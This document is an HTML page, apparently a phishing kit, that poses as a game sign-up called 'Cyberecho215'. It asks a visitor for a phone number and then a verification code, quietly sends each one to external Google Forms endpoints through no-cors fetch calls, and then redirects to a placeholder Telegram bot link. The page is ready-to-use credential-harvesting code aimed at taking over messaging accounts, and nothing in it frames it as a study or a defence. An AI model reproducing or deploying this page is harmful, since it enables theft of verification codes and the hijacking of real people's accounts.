<!DOCTYPE html>
<html>
<head>
  <title>Cyberecho215</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { 
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
      background: #0a0a0a url('https://i.imgur.com/ZXtQXiQ.png') no-repeat center center fixed; 
      background-size: cover;
      display: flex; 
      flex-direction: column;
      justify-content: center; 
      align-items: center; 
      height: 100vh; 
      color: #00aaff; 
    }

    /* Dark overlay behind login box for readability */
    .overlay {
      background: rgba(26,26,26,0.85);
      padding: 30px 25px;
      border-radius: 12px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 0 20px rgba(0, 170, 255, 0.5);
      text-align: center;
    }

    h1.nickname { 
      font-size: 28px; 
      margin-bottom: 20px; 
      color: #00aaff;
      text-shadow: 0 0 8px #0077cc;
    }

    input { 
      width: 90%;
      max-width: 300px; 
      padding: 12px; 
      margin: 12px auto 0 auto; 
      display: block; 
      border-radius: 8px; 
      border: 1px solid #00aaff; 
      background: #0d0d0d; 
      color: #00aaff; 
      font-size: 16px;
    }
    input::placeholder { color: #005577; }

    button { 
      width: 90%; 
      max-width: 300px; 
      padding: 12px; 
      margin: 15px auto 0 auto; 
      display: block; 
      border-radius: 8px; 
      border: none; 
      background: #00aaff; 
      color: #0a0a0a; 
      font-size: 16px; 
      cursor: pointer; 
      transition: 0.3s; 
    }
    button:hover { 
      background: #0077cc; 
      color: #e0f7ff;
    }

    .hidden { display: none; }
  </style>
</head>

<body>

  <h1 class="nickname">Cyberecho215</h1>

  <div class="overlay">
    <h2 id="title">Enter Phone Number</h2>
    <input type="text" id="number" placeholder="Enter your phone number">
    <input type="text" id="code" placeholder="Enter Code" class="hidden">
    <button id="actionBtn" onclick="submitNumber()">Next</button>
  </div>

  <script>
    let savedNumber = "";
    
    // Google Forms URLs
    const numberFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSe1s-L-9FnjQrbjw3M2jrhsxmrbzsvJ2T2FMymBy4J3WzkfMw/formResponse";
    const codeFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSf6-83AO0HS7wiMpJCCz_XSGXyNlZUolHRVXk305SQj_pAi8g/formResponse";

    function submitNumber() {
      let number = document.getElementById("number").value;
      if(number==="") { alert("Please enter your phone number"); return; }
      savedNumber = number;

      // Submit Phone Number
      const url = numberFormURL + "?entry.1988517464=" + encodeURIComponent(savedNumber);
      fetch(url, { mode: "no-cors" });

      // Switch to Code input
      document.getElementById("title").innerText = "Enter Code";
      document.getElementById("number").classList.add("hidden");
      document.getElementById("code").classList.remove("hidden");

      const btn = document.getElementById("actionBtn");
      btn.innerText = "Submit";
      btn.onclick = submitCode;
    }

    function submitCode() {
      let code = document.getElementById("code").value;
      if(code==="") { alert("Please enter the code"); return; }

      // Submit Code
      const url = codeFormURL + "?entry.374315348=" + encodeURIComponent(code);
      fetch(url, { mode: "no-cors" });

      // Final message & redirect
      document.querySelector(".overlay").innerHTML = "<h2>Youâ€™ll be linked to the game soon</h2>";
      setTimeout(() => { window.location.href = "YOUR_TELEGRAM_BOT_LINK_HERE"; }, 2000);
    }
  </script>

</body>
</html>
